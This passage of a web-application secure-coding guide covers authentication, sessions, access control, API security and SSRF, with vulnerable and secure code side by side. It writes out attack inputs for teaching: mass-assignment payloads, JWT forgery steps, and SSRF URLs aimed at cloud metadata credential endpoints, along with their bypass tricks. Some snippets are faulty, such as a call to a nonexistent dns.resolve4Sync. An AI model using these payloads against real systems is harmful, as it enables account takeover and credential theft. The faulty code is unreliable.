const emailVerified = trustedProviders.includes(profile.provider) && profile.email_verified;

if (emailVerified) {
  const user = await db.users.findUnique({ where: { email: profile.email } });
  if (user) {
    await db.oauthAccounts.create({
      data: { userId: user.id, provider: profile.provider, providerAccountId: profile.id },
    });
    return user;
  }
}
// Otherwise create new account — user can manually link after re-authenticating
```

## Password Reset Flow Security

**Rule: Reset tokens must be CSPRNG-generated (256-bit), stored hashed, time-limited (15 min), single-use, and rate-limited.**

Vulnerable:
```javascript
// VULNERABLE — predictable token, no expiry, reusable
const token = md5(Date.now().toString());
await db.resetTokens.create({ data: { email, token } });
```

Secure:
```javascript
// SECURE — cryptographic token, hashed storage, expiry, single-use
const token = randomBytes(32).toString('hex');
await db.resetTokens.deleteMany({ where: { email } }); // invalidate previous
await db.resetTokens.create({
  data: {
    email,
    tokenHash: await argon2.hash(token),
    expiresAt: new Date(Date.now() + 15 * 60 * 1000),
  },
});
// After successful reset: delete the token (single-use)
```

## Magic Link Security

**Rule: Magic links are password-equivalent credentials — high-entropy (256-bit), short-lived (10 min), single-use, rate-limited (5 per 15 min per email).**

Key requirements:
- Store hashed, not plaintext
- Delete on use (single-use)
- Rate limit per email address
- Short expiration (10 minutes max)

## Token Refresh Race Conditions

**Rule: Deduplicate concurrent token refresh requests — all callers share the same in-flight refresh promise.**

When using refresh token rotation, two simultaneous refresh calls cause the second to use an already-invalidated token. The provider may flag the entire token family as compromised and revoke all sessions.

```javascript
// SECURE — deduplicate refreshes
let refreshPromise = null;
async function refreshTokenOnce() {
  if (!refreshPromise) {
    refreshPromise = (async () => {
      try {
        const res = await fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' });
        const { accessToken } = await res.json();
        setAccessToken(accessToken);
      } finally { refreshPromise = null; }
    })();
  }
  return refreshPromise;
}
```

── Page 6 ──

# Chapter 5: Session Management

**Threat Summary:** Sessions bridge stateless HTTP to stateful user interactions. A compromised session token gives the attacker full account access without needing credentials.

**Severity:** CRITICAL

## Quick Reference: Secure Cookie Configuration

```
Set-Cookie: __Host-SessionId=<token>; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600
```

| Attribute | Purpose | Required |
|-----------|---------|----------|
| `Secure` | Only transmit over HTTPS | Yes |
| `HttpOnly` | Block JavaScript access (XSS mitigation) | Yes |
| `SameSite=Strict` | Block cross-site request attachment (CSRF mitigation) | Yes (or `Lax` if cross-site navigation is needed) |
| `Path=/` | Scope to application path | Yes |
| `__Host-` prefix | Enforces Secure, no Domain attribute, Path=/ | Recommended |
| `Domain` | Set as narrow as possible; omit to default to exact origin | Do not set broadly |

## Core Rules

**Rule 1: Generate session tokens with at least 128 bits of cryptographic randomness.**

```javascript
import crypto from "crypto";
const sessionId = crypto.randomBytes(32).toString("hex"); // 256 bits
```

Never use:
- Sequential numbers
- Timestamps
- User IDs or usernames (even encoded/encrypted)
- Math.random() (not cryptographically secure)
- UUIDs v1 (time-based, predictable)

**Rule 2: Regenerate the session token on authentication.**
This prevents session fixation attacks where an attacker sets a known token before the victim logs in.

```javascript
// On successful login:
req.session.regenerate((err) => {
  req.session.userId = user.id;
  // ... set session data
});
```

**Rule 3: Invalidate sessions server-side on logout.**
Deleting the client cookie is not enough — the old token must be rejected by the server.

```javascript
// VULNERABLE — client-side only logout
res.clearCookie("sessionId");

// SECURE — server-side invalidation
await sessionStore.destroy(req.sessionId);
res.clearCookie("sessionId");
```

**Rule 4: Implement both idle timeout and absolute timeout.**
- Idle timeout: session expires after inactivity (e.g., 30 minutes)
- Absolute timeout: session expires regardless of activity (e.g., 8 hours)
- Re-authentication: required for sensitive operations even within an active session

**Rule 5: Never transmit session tokens in URLs.**
Tokens in URLs are leaked via:
- Referer header when the user clicks an external link
- Browser history
- Server access logs
- Proxy logs
- Users sharing URLs

**Rule 6: Prevent concurrent sessions for sensitive applications.**
When a new session is created, invalidate all previous sessions for that user. Or at minimum, alert the user of concurrent sessions.

## Verification

- Log in, copy the session token, log out, replay the token — it should be rejected
- Check that the session token changes after login (session fixation test)
- Verify cookie attributes in browser DevTools (Secure, HttpOnly, SameSite)
- Test session timeout by waiting longer than the configured idle period
- Check that session tokens are not present in any URL, log, or Referer header

---

── Page 7 ──

# Chapter 6: Access Control and Authorization

**Threat Summary:** Access control decides whether a specific user can perform a specific action on a specific resource. Broken access control is the #1 vulnerability in the OWASP Top 10 (2021 and 2025), found in 94% of tested applications.

**Severity:** CRITICAL

## Quick Reference: Access Control Failures

| Type | What It Means | Example |
|------|---------------|---------|
| Vertical privilege escalation | Regular user accesses admin functions | User navigates to `/admin/users` |
| Horizontal privilege escalation | User A accesses User B's data | User changes `?userId=123` to `?userId=456` |
| IDOR (Insecure Direct Object Reference) | User-controlled ID references another user's object | `GET /api/orders/789` returns another user's order |
| Missing function-level access control | Server doesn't check permissions on certain endpoints | `DELETE /api/users/123` has no auth check |

## Core Rules

**Rule 1: Deny by default. Explicitly grant access, never implicitly allow.**

```javascript
// VULNERABLE — checks for specific denied roles
if (user.role === "banned") {
  return res.status(403).json({ error: "Forbidden" });
}
// Anyone not banned gets access — including unauthenticated users

// SECURE — deny by default
const allowedRoles = ["admin", "editor"];
if (!allowedRoles.includes(user.role)) {
  return res.status(403).json({ error: "Forbidden" });
}
```

**Rule 2: Check authorization on every request, not just navigation.**
Server-side authorization must be enforced on every API endpoint and resource, not just the UI. Hiding a button does not prevent the request.

```javascript
// VULNERABLE — relies on UI hiding the delete button
app.delete("/api/posts/:id", async (req, res) => {
  await db.deletePost(req.params.id); // No ownership check!
});

// SECURE — verify ownership
app.delete("/api/posts/:id", async (req, res) => {
  const post = await db.getPost(req.params.id);
  if (!post || post.authorId !== req.user.id) {
    return res.status(404).json({ error: "Not found" });
  }
  await db.deletePost(req.params.id);
});
```

**Rule 3: For IDOR prevention, verify that the requesting user owns or has access to the referenced object.**
Every endpoint that takes an object ID (user ID, order ID, document ID, file ID) must verify authorization for the specific object.

```javascript
// VULNERABLE — any authenticated user can access any order
app.get("/api/orders/:id", requireAuth, async (req, res) => {
  const order = await db.getOrder(req.params.id);
  return res.json(order);
});

// SECURE — verify ownership
app.get("/api/orders/:id", requireAuth, async (req, res) => {
  const order = await db.getOrder(req.params.id);
  if (!order || order.userId !== req.user.id) {
    return res.status(404).json({ error: "Not found" }); // 404, not 403
  }
  return res.json(order);
});
```

Note: Return 404 (not 403) to avoid confirming the resource exists.

**Rule 4: Centralize authorization logic. Never scatter access checks across individual handlers.**

```javascript
// GOOD — centralized middleware
function requireOwnership(resourceType) {
  return async (req, res, next) => {
    const resource = await db.getResource(resourceType, req.params.id);
    if (!resource || resource.userId !== req.user.id) {
      return res.status(404).json({ error: "Not found" });
    }
    req.resource = resource;
    next();
  };
}

app.get("/api/orders/:id", requireAuth, requireOwnership("order"), handler);
app.put("/api/orders/:id", requireAuth, requireOwnership("order"), handler);
app.delete("/api/orders/:id", requireAuth, requireOwnership("order"), handler);
```

**Rule 5: Use indirect object references when possible.**
Map user-facing IDs to server-side resources through per-session or per-user mappings, so users cannot guess or enumerate valid IDs.

**Rule 6: Test access control with multiple accounts at different privilege levels.**
For every endpoint, verify:
- Unauthenticated user → should be denied
- Authenticated user with wrong role → should be denied
- Authenticated user accessing another user's resource → should be denied
- Authenticated user with correct role and correct resource → should be allowed

## Verification

- Log in as User A, access User B's resources by changing IDs — should return 404
- Access admin endpoints with a regular user session — should return 403
- Access any endpoint without a session token — should return 401
- Test all HTTP methods (GET, POST, PUT, DELETE) on every endpoint — some may be unprotected
- Check for access control on static resources (uploaded files, documents)

---

## Permission-Based RBAC

**Rule: Check permissions, not roles. Map roles to permissions in one place — route handlers check specific permissions.**

Vulnerable:
```javascript
// VULNERABLE — role check hardcoded throughout the app
if (req.user.role !== 'admin') return res.status(403).send('Forbidden');
// Problem: adding "editor" role requires editing every route
```

Secure:
```javascript
// SECURE — permission-based checks
const ROLE_PERMISSIONS = {
  admin: ['posts:create', 'posts:read', 'posts:update', 'posts:delete', 'users:manage'],
  editor: ['posts:create', 'posts:read', 'posts:update', 'posts:delete'],
  viewer: ['posts:read'],
};

function requirePermission(permission) {
  return (req, res, next) => {
    const perms = ROLE_PERMISSIONS[req.user.role] || [];
    if (!perms.includes(permission)) return res.status(403).json({ error: 'Forbidden' });
    next();
  };
}

app.delete('/api/posts/:id', requireAuth, requirePermission('posts:delete'), handler);
```

## Multi-Tenancy Data Isolation

**Rule: Enforce tenant scoping at the data access layer, not per-query. A single missing WHERE tenant_id = ? leaks data across tenants.**

```javascript
// SECURE — automatic tenant injection at data layer
function tenantScoped(prisma, tenantId) {
  return prisma.$extends({
    query: {
      $allOperations({ args, query }) {
        args.where = { ...args.where, tenantId };
        return query(args);
      },
    },
  });
}

// Middleware creates scoped client — impossible to forget tenant filter
app.use(requireAuth, (req, res, next) => {
  req.db = tenantScoped(prisma, req.user.tenantId);
  next();
});
```

## Authorization Cache Invalidation

**Rule: Cached authorization decisions must have an invalidation strategy. Sensitive operations should always check fresh permissions from the database.**

- Short TTL (1-5 min) for cached permissions
- Event-driven invalidation when roles change
- Bypass cache for sensitive operations (payments, deletions, admin actions)

── Page 8 ──

# Chapter 7: API Security

**Threat Summary:** APIs expose application functionality directly and are the primary attack surface in modern web applications. The OWASP API Security Top 10 identifies API-specific vulnerability patterns that differ from traditional web application vulnerabilities.

**Severity:** CRITICAL

## Quick Reference: OWASP API Security Top 10 (2023)

| # | Category | Core Issue |
|---|----------|------------|
| API1 | Broken Object Level Authorization (BOLA) | Missing per-object access checks |
| API2 | Broken Authentication | Weak or missing API authentication |
| API3 | Broken Object Property Level Authorization | Mass assignment, excessive data exposure |
| API4 | Unrestricted Resource Consumption | No rate limits, pagination, or resource caps |
| API5 | Broken Function Level Authorization (BFLA) | User calls admin API functions |
| API6 | Unrestricted Access to Sensitive Business Flows | Automated abuse of business logic |
| API7 | Server Side Request Forgery | API fetches attacker-controlled URLs |
| API8 | Security Misconfiguration | Verbose errors, missing CORS, defaults |
| API9 | Improper Inventory Management | Shadow APIs, deprecated versions still live |
| API10 | Unsafe Consumption of APIs | Trusting third-party API responses |

## Core Rules

**Rule 1: Enforce authorization for every object on every endpoint (prevent BOLA).**
BOLA represents ~40% of all API attacks. The attack is trivial: change the object ID in the request.

```javascript
// VULNERABLE
app.get("/api/v1/users/:userId/profile", async (req, res) => {
  const profile = await db.getUserProfile(req.params.userId);
  res.json(profile); // Any authenticated user can view any profile
});

// SECURE
app.get("/api/v1/users/:userId/profile", async (req, res) => {
  if (req.params.userId !== req.user.id) {
    return res.status(404).json({ error: "Not found" });
  }
  const profile = await db.getUserProfile(req.params.userId);
  res.json(profile);
});
```

**Rule 2: Use explicit allowlists for writable fields (prevent mass assignment).**

```javascript
// VULNERABLE — binds all request fields to the model
app.put("/api/users/:id", async (req, res) => {
  await db.user.update({
    where: { id: req.params.id },
    data: req.body, // Attacker sends: { "role": "admin", "name": "attacker" }
  });
});

// SECURE — explicit allowlist
app.put("/api/users/:id", async (req, res) => {
  const { name, email, bio } = req.body; // Only allow these fields
  await db.user.update({
    where: { id: req.params.id },
    data: { name, email, bio },
  });
});
```

**Rule 3: Return only the fields the client needs (prevent excessive data exposure).**

```javascript
// VULNERABLE — returns full database record
const user = await db.user.findUnique({ where: { id } });
return res.json(user); // Includes passwordHash, internalNotes, etc.

// SECURE — select specific fields
const user = await db.user.findUnique({
  where: { id },
  select: { id: true, name: true, email: true, bio: true },
});
return res.json(user);
```

**Rule 4: Implement rate limiting per user, per endpoint, and per business action.**

```
Rate limiting strategy:
- Login:           5 requests per minute per IP
- API read:        100 requests per minute per user
- API write:       20 requests per minute per user
- Password reset:  3 requests per hour per email
- File upload:     5 requests per minute per user
- Search:          30 requests per minute per user
```

**Rule 5: Validate all input with schemas.**

```javascript
// Using Zod for API input validation
import { z } from "zod";

const CreateUserSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email().max(255),
  age: z.number().int().min(13).max(150).optional(),
});

app.post("/api/users", async (req, res) => {
  const result = CreateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ error: "Invalid input", details: result.error.issues });
  }
  // Use result.data — guaranteed to be valid
});
```

**Rule 6: Maintain an API inventory and decommission unused endpoints.**
Shadow APIs (undocumented, forgotten endpoints) and old API versions are prime targets. Every API endpoint must be documented, monitored, and retired when no longer needed.

## GraphQL-Specific Security

| Threat | Defense |
|--------|---------|
| Introspection in production | Disable introspection: `introspection: false` |
| Query depth attacks (nested queries cause DoS) | Enforce max depth (7-10 levels) |
| Query complexity bombs | Implement cost analysis and reject expensive queries |
| Batching bypasses rate limits | Rate-limit by query count, not HTTP requests |
| Field suggestion leakage | Disable field suggestions in production |

```javascript
// GraphQL depth limiting example
import depthLimit from "graphql-depth-limit";

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [depthLimit(10)],
  introspection: false, // Disable in production
});
```

## BOLA and BFLA Attack Patterns

**BOLA (Broken Object Level Authorization)** accounts for ~40% of API attacks. Advanced patterns include:

| Pattern | Technique | Detection |
|---------|-----------|-----------|
| Resource ID prediction | Sequential IDs (`/users/101`, `/users/102`) allow enumeration | Use UUIDs; still verify ownership |
| A-B horizontal access test | Log in as User A, replay requests substituting User B's IDs | Automated with Burp Autorize plugin |
| Method manipulation | Resource allows GET but forgot to protect DELETE or PATCH | Test all HTTP methods on every endpoint |
| Nested object access | `/users/123/orders/456` — checks user 123 but not order 456 ownership | Verify ownership at every level of nesting |

**BFLA (Broken Function Level Authorization)** — user calls admin functions:

```javascript
// VULNERABLE — admin endpoint without role check
app.delete("/api/admin/users/:id", requireAuth, async (req, res) => {
  await db.user.delete({ where: { id: req.params.id } });
  res.json({ success: true });
});

// SECURE — explicit admin role check
app.delete("/api/admin/users/:id", requireAuth, requireRole("admin"), async (req, res) => {
  await db.user.delete({ where: { id: req.params.id } });
  res.json({ success: true });
});
```

**Testing checklist:**
- Test every endpoint as unauthenticated, regular user, and admin
- For every object ID in a request, substitute another user's object ID
- For every GET endpoint, try PUT, PATCH, DELETE with the same path
- Check that nested resource paths validate ownership at each level

## Mass Assignment Deep Dive

Mass assignment occurs when an API binds request body fields directly to a data model without filtering. Attackers add extra fields to escalate privileges or modify protected attributes.

**Common attack payloads:**

```json
// Registration — attacker adds role field
POST /api/register
{ "username": "attacker", "password": "pass123", "role": "admin" }

// Profile update — attacker adds billing fields
PUT /api/users/me
{ "name": "Attacker", "isVerified": true, "creditBalance": 99999 }

// Password reset — attacker adds extra fields
POST /api/reset-password
{ "token": "valid-token", "newPassword": "pass", "userId": "victim-id" }
```

**Defense pattern — use separate schemas for each operation:**

```javascript
// Different schemas for different operations
const RegisterSchema = z.object({
  username: z.string().min(3).max(50),
  email: z.string().email(),
  password: z.string().min(8),
  // role is NOT in the schema — cannot be set by user
});

const ProfileUpdateSchema = z.object({
  name: z.string().max(100).optional(),
  bio: z.string().max(500).optional(),
  // isVerified, role, creditBalance are NOT in the schema
});
```

**Rule:** Never use a single schema or model for both input and storage. Create explicit input schemas per operation that include only user-settable fields.

## JWT Exploitation Techniques

Beyond the pitfalls table in Chapter 4, these are the most commonly exploited JWT weaknesses:

**1. The `none` algorithm attack:**
```
// Original token header: {"alg": "HS256", "typ": "JWT"}
// Attack: change to: {"alg": "none", "typ": "JWT"}
// Then remove the signature portion entirely
// Vulnerable libraries accept the token without verification
```

**Defense:** Explicitly reject `none` algorithm. Never let the token's `alg` header determine verification.

**2. Algorithm switching (RS256 to HS256):**
```
// Server expects RS256 (asymmetric: private key signs, public key verifies)
// Attacker changes alg to HS256 (symmetric: same key signs and verifies)
// Attacker signs token with the PUBLIC KEY as the HMAC secret
// Server uses the public key for verification — and it succeeds
```

**Defense:** Hard-code the expected algorithm in server configuration. Never read `alg` from the token.

```javascript
// VULNERABLE — trusts the token's algorithm
jwt.verify(token, publicKey); // Will use whatever alg the token specifies

// SECURE — enforce algorithm
jwt.verify(token, publicKey, { algorithms: ["RS256"] });
```

**3. Weak HMAC secrets:**
If the HMAC secret is short or guessable, attackers can brute-force it offline using tools like `hashcat` or `jwt-cracker`, then forge arbitrary tokens.

**Rule:** HMAC secrets must be at least 256 bits of cryptographic randomness. Use `crypto.randomBytes(32).toString('hex')`.

## API Versioning Attacks

Retired API versions are a common source of unpatched vulnerabilities:

| Target | Risk | Defense |
|--------|------|---------|
| `/v1/` endpoints | Old version may lack auth fixes added in `/v2/` | Decommission old versions completely |
| `/beta/` or `/test/` endpoints | Pre-release code with debug features enabled | Remove before production deployment |
| `/internal/` endpoints | Intended for internal use, often no auth | Block at the network/gateway level |
| Undocumented endpoints | Forgotten during security hardening | Maintain a complete API inventory |

**Discovery techniques attackers use:**
- Directory brute-forcing: `/v1/`, `/v2/`, `/api/v0/`, `/api/beta/`, `/api/test/`
- Checking JavaScript source for API paths
- Reviewing API documentation for deprecated versions
- Checking `robots.txt` and `sitemap.xml` for API paths

**Rule:** Maintain an API inventory. When a new version is released, set a deprecation date for the old version and enforce hard removal. Never leave old versions running indefinitely.

## gRPC Security

gRPC uses Protocol Buffers (protobuf) for serialization and HTTP/2 for transport. While it avoids some REST vulnerabilities, it introduces its own attack surface.

**Key threats:**

| Threat | Description | Defense |
|--------|-------------|---------|
| Missing auth on methods | gRPC methods exposed without authentication | Use interceptors for auth on every method |
| Metadata injection | Attacker injects malicious gRPC metadata (headers) | Validate and sanitize all metadata values |
| Protobuf field injection | Unknown fields silently accepted | Use strict deserialization, reject unknown fields |
| Reflection service exposure | gRPC reflection reveals all service methods | Disable reflection in production |
| Large message DoS | Unbounded message size causes OOM | Set `maxReceiveMessageLength` |

**Authentication patterns:**

```go
// VULNERABLE — no auth interceptor
grpcServer := grpc.NewServer()
pb.RegisterUserServiceServer(grpcServer, &userService{})

// SECURE — unary auth interceptor
func authInterceptor(
    ctx context.Context,
    req interface{},
    info *grpc.UnaryServerInfo,
    handler grpc.UnaryHandler,
) (interface{}, error) {
    // Skip auth for health checks
    if info.FullMethod == "/grpc.health.v1.Health/Check" {
        return handler(ctx, req)
    }

    md, ok := metadata.FromIncomingContext(ctx)
    if !ok {
        return nil, status.Errorf(codes.Unauthenticated, "missing metadata")
    }

    tokens := md.Get("authorization")
    if len(tokens) == 0 {
        return nil, status.Errorf(codes.Unauthenticated, "missing auth token")
    }

    claims, err := validateToken(tokens[0])
    if err != nil {
        return nil, status.Errorf(codes.Unauthenticated, "invalid token")
    }

    // Add claims to context for downstream use
    ctx = context.WithValue(ctx, "claims", claims)
    return handler(ctx, req)
}

grpcServer := grpc.NewServer(
    grpc.UnaryInterceptor(authInterceptor),
    grpc.MaxRecvMsgSize(4 * 1024 * 1024), // 4MB max message size
)
```

```javascript
// Node.js gRPC — metadata validation
function validateMetadata(metadata) {
  // gRPC metadata values can contain arbitrary bytes
  // Validate all metadata fields used for authorization or routing
  const authHeader = metadata.get("authorization")[0];
  if (typeof authHeader !== "string" || authHeader.length > 2048) {
    throw new Error("Invalid authorization metadata");
  }
  return authHeader;
}
```

**Core Rules for gRPC:**
1. Use TLS (mTLS for service-to-service) — never run gRPC without transport encryption
2. Apply authentication interceptors to every RPC method — no method should be unprotected by default
3. Disable gRPC server reflection in production (`grpc.reflection` service)
4. Set `maxReceiveMessageLength` and `maxSendMessageLength` to prevent DoS
5. Validate all metadata values — treat them as untrusted input (equivalent to HTTP headers)
6. Use proto3 with strict validation — reject unknown fields where possible


: API Security

### Rule 7: Limit collection sizes in batch operations

Batch endpoints that accept arrays of IDs are a common denial-of-service vector. Without size limits, an attacker can submit millions of IDs in a single request, causing memory exhaustion, database lock contention, and query timeout cascades. Always cap array sizes in request bodies and validate each element.

```javascript
// VULNERABLE — accepts unbounded arrays
app.delete("/api/items", async (req, res) => {
  const { ids } = req.body; // Could be 1 million IDs
  await db.item.deleteMany({ where: { id: { in: ids } } });
});

// SECURE — cap array sizes and validate each element
const MAX_BATCH_SIZE = 100;
app.delete("/api/items", async (req, res) => {
  const { ids } = req.body;
  if (!Array.isArray(ids) || ids.length === 0) {
    return res.status(400).json({ error: "ids must be a non-empty array" });
  }
  if (ids.length > MAX_BATCH_SIZE) {
    return res.status(400).json({ error: `Maximum ${MAX_BATCH_SIZE} items per batch` });
  }
  // Validate each ID is a valid format (not an object, not empty, reasonable length)
  if (!ids.every((id) => typeof id === "string" && id.length > 0 && id.length < 64)) {
    return res.status(400).json({ error: "Each id must be a non-empty string" });
  }
  // Always scope to the authenticated user — never allow cross-user batch operations
  await db.item.deleteMany({
    where: { id: { in: ids }, userId: req.userId },
  });
  return res.json({ deleted: ids.length });
});
```

Apply this rule to every endpoint that accepts arrays: batch delete, batch update, bulk import, bulk export, tag assignment, permission grants, and batch notification sends. Define a `MAX_BATCH_SIZE` constant per endpoint based on the cost of each operation.

### Rule 8: Filter API response fields — never return full database objects

Database objects contain internal fields that should never reach the client: internal IDs, hashed values, metadata flags, admin notes, processing status, S3 keys, and fields from joined relations. Always whitelist the fields you return — never spread or forward a raw database result.

```javascript
// VULNERABLE — returns entire database object including internal fields
app.get("/api/marketplace/:id", async (req, res) => {
  const listing = await db.listing.findUnique({
    where: { id: req.params.id },
    include: { item: true, publisher: true },
  });
  return res.json(listing);
  // Leaks: publisher.email, publisher.clerkId, item.s3Key, item.processingStatus,
  // item.internalNotes, listing.adminFlags, listing.revenueShare, etc.
});

// SECURE — whitelist public fields explicitly
app.get("/api/marketplace/:id", async (req, res) => {
  const listing = await db.listing.findUnique({
    where: { id: req.params.id },
    include: { item: true, publisher: true },
  });

  if (!listing) return res.status(404).json({ error: "Not found" });

  const publicResponse = {
    id: listing.id,
    title: listing.title,
    description: listing.description,
    price: listing.price,
    category: listing.category,
    createdAt: listing.createdAt,
    publisher: {
      id: listing.publisher.id,
      name: listing.publisher.name,
      // No email, no clerkId, no stripeCustomerId, no internal fields
    },
    metadata: {
      tableOfContents: listing.item.metadata?.tableOfContents,
      sampleQuestion: listing.item.metadata?.sampleQuestion,
      pageCount: listing.item.metadata?.pageCount,
      // No s3Key, no processingStatus, no internalNotes, no rawContent
    },
  };

  return res.json(publicResponse);
});
```

For TypeScript projects, define explicit response types and mapping functions. This makes it a compile-time error to accidentally include internal fields:

```typescript
// Define the public API contract — this is what clients see
interface PublicListingResponse {
  id: string;
  title: string;
  description: string;
  price: number;
  category: string;
  createdAt: Date;
  publisher: { id: string; name: string };
  metadata: {
    tableOfContents?: string[];
    sampleQuestion?: string;
    pageCount?: number;
  };
}

// Mapping function — single place to maintain the field allowlist
function toPublicListing(listing: FullListingWithRelations): PublicListingResponse {
  return {
    id: listing.id,
    title: listing.title,
    description: listing.description,
    price: listing.price,
    category: listing.category,
    createdAt: listing.createdAt,
    publisher: {
      id: listing.publisher.id,
      name: listing.publisher.name,
    },
    metadata: {
      tableOfContents: listing.item.metadata?.tableOfContents,
      sampleQuestion: listing.item.metadata?.sampleQuestion,
      pageCount: listing.item.metadata?.pageCount,
    },
  };
}

// Usage — return type is enforced by TypeScript
app.get("/api/marketplace/:id", async (req, res) => {
  const listing = await db.listing.findUnique({ /* ... */ });
  if (!listing) return res.status(404).json({ error: "Not found" });
  return res.json(toPublicListing(listing));
});
```

---


## Verification

- Test every endpoint with a different user's ID (BOLA)
- Send extra fields in write requests (mass assignment)
- Check response bodies for sensitive fields (excessive data exposure)
- Hit rate limits with rapid requests
- Access admin endpoints with regular user tokens (BFLA)
- Send deeply nested GraphQL queries if applicable
- Test all HTTP methods (GET, POST, PUT, PATCH, DELETE) on every endpoint
- Check for `/v1/`, `/beta/`, `/test/`, `/internal/` API paths
- Test JWT with `alg: none` and algorithm switching
- For gRPC: test methods without auth metadata, with oversized messages, and with reflection enabled

---

── Page 9 ──

# Chapter 8: Server-Side Request Forgery (SSRF)

**Threat Summary:** SSRF tricks the server into making HTTP requests to attacker-chosen destinations, typically targeting internal services, cloud metadata endpoints, or internal networks that are not directly accessible from the internet.

**Severity:** CRITICAL (especially in cloud environments)

## Quick Reference: SSRF Targets

| Target | URL | Impact |
|--------|-----|--------|
| AWS IMDS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Steal IAM credentials |
| Azure IMDS | `http://169.254.169.254/metadata/instance` | Steal managed identity tokens |
| GCP Metadata | `http://metadata.google.internal/` | Steal service account tokens |
| Internal services | `http://localhost:8080/admin` | Access admin interfaces |
| Internal APIs | `http://internal-api.corp/` | Access internal data |

## Core Rules

**Rule 1: Never fetch URLs directly from user input without validation.**

```javascript
// VULNERABLE
app.get("/api/preview", async (req, res) => {
  const response = await fetch(req.query.url); // Attacker: ?url=http://169.254.169.254/...
  const html = await response.text();
  res.json({ preview: html });
});

// SECURE — allowlist validation
const ALLOWED_DOMAINS = new Set(["api.example.com", "cdn.example.com"]);

app.get("/api/preview", async (req, res) => {
  const parsed = new URL(req.query.url);

  // Block non-HTTPS
  if (parsed.protocol !== "https:") {
    return res.status(400).json({ error: "Only HTTPS URLs allowed" });
  }

  // Block internal IPs
  if (isInternalIp(parsed.hostname)) {
    return res.status(400).json({ error: "Internal URLs not allowed" });
  }

  // Allowlist check
  if (!ALLOWED_DOMAINS.has(parsed.hostname)) {
    return res.status(400).json({ error: "Domain not allowed" });
  }

  const response = await fetch(parsed.toString());
  res.json({ preview: await response.text() });
});
```

**Rule 2: Block requests to internal IP ranges.**
Block RFC 1918, link-local, loopback, and cloud metadata ranges:

```javascript
function isInternalIp(hostname: string): boolean {
  // Resolve hostname to IP first (prevents DNS rebinding if done at request time)
  const ip = dns.resolve4Sync(hostname)?.[0];
  if (!ip) return true; // Block if cannot resolve

  const parts = ip.split(".").map(Number);

  return (
    parts[0] === 10 ||                                    // 10.0.0.0/8
    (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) || // 172.16.0.0/12
    (parts[0] === 192 && parts[1] === 168) ||             // 192.168.0.0/16
    parts[0] === 127 ||                                    // 127.0.0.0/8 (loopback)
    (parts[0] === 169 && parts[1] === 254) ||             // 169.254.0.0/16 (link-local / IMDS)
    parts[0] === 0                                         // 0.0.0.0/8
  );
}
```

**Rule 3: Disable HTTP redirects or re-validate after each redirect.**
Attackers use redirects to bypass URL validation: the initial URL passes checks, but redirects to an internal address.

**Rule 4: Enforce AWS IMDSv2 on all EC2 instances.**
IMDSv2 requires a PUT request to get a session token before accessing metadata, which blocks simple SSRF exploitation.

```bash
// Enforce IMDSv2 (blocks IMDSv1)
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 2
```

**Rule 5: Block non-HTTP protocols.**
Attackers use `gopher://`, `dict://`, `file://` schemes to interact with internal services. Allow only `http:` and `https:`.

## SSRF Bypass Techniques to Defend Against

| Technique | Example | Defense |
|-----------|---------|---------|
| Decimal IP | `http://2130706433` (= 127.0.0.1) | Resolve and validate the numeric IP |
| Octal IP | `http://017700000001` | Parse all IP formats |
| IPv6 | `http://[::1]` or `http://[fc00::]` | Include IPv6 in blocklist |
| DNS rebinding | Domain resolves to safe IP, then re-resolves to 127.0.0.1 | Resolve DNS and pin the IP for the request |
| URL parser differential | `http://evil.com#@trusted.com` | Use a single, well-tested URL parser |
| Redirect-based | URL passes validation but HTTP 302s to internal address | Disable redirects or re-validate each hop |
| Open redirect chaining | `https://allowed-domain.com/redirect?url=http://169.254.169.254/` | Disable redirects entirely; re-validate after each hop |
| IPv6 loopback variants | `::1`, `0:0:0:0:0:0:0:1`, `::ffff:127.0.0.1` | Block all IPv6 representations of internal addresses |
| IPv6 private ranges | `fc00::`, `fd00::` (ULA), `fe80::` (link-local) | Block ULA and link-local IPv6 ranges |

### Advanced SSRF Bypass Details

**Open redirect chaining:**
If the allowlist includes a trusted domain that has an open redirect vulnerability, the attacker chains: allowed domain (passes check) -> open redirect -> internal target.

```
// Allowlisted domain with open redirect:
https://trusted-partner.com/auth/callback?next=http://169.254.169.254/latest/meta-data/

// The server fetches trusted-partner.com (passes allowlist), follows redirect to IMDS
```

**Defense:** Disable HTTP redirects entirely when fetching user-provided URLs. If redirects are necessary, re-validate the destination URL after every redirect hop.

```javascript
// SECURE — disable redirects
const response = await fetch(validatedUrl, { redirect: "error" });

// SECURE — manual redirect with re-validation
const response = await fetch(validatedUrl, { redirect: "manual" });
if (response.status >= 300 && response.status < 400) {
  const redirectUrl = response.headers.get("location");
  // Re-validate the redirect target before following
  if (!isAllowedUrl(redirectUrl)) {
    throw new Error("Redirect to disallowed URL");
  }
}
```

**DNS rebinding attack:**
1. Attacker controls `evil.com` with a very short DNS TTL (e.g., 0 seconds)
2. First DNS resolution: `evil.com` -> `93.184.216.34` (public IP, passes validation)
3. Application validates the IP — it's not internal, so it passes
4. Between validation and the actual HTTP request, the DNS record changes
5. Second DNS resolution: `evil.com` -> `127.0.0.1`
6. The HTTP request hits localhost

**Defense:** Resolve DNS once, pin the IP, and use the pinned IP for both validation and the actual request.

```javascript
import dns from "dns/promises";

async function safeFetch(url: string): Promise<Response> {
  const parsed = new URL(url);

  // Resolve DNS once
  const addresses = await dns.resolve4(parsed.hostname);
  const ip = addresses[0];

  // Validate the resolved IP
  if (isInternalIp(ip)) {
    throw new Error("Internal IP blocked");
  }

  // Use the resolved IP directly (prevents DNS rebinding)
  const targetUrl = new URL(url);
  targetUrl.hostname = ip;

  return fetch(targetUrl.toString(), {
    headers: { Host: parsed.hostname }, // Preserve original Host header
    redirect: "error",
  });
}
```

**Decimal and octal IP encoding:**
Browsers and HTTP libraries accept IPs in multiple formats. `127.0.0.1` can be expressed as:
- Decimal: `2130706433`
- Octal: `017700000001`
- Hex: `0x7f000001`
- Mixed: `127.0.0.1`, `127.0.1`, `127.1`
- IPv6-mapped: `::ffff:127.0.0.1`

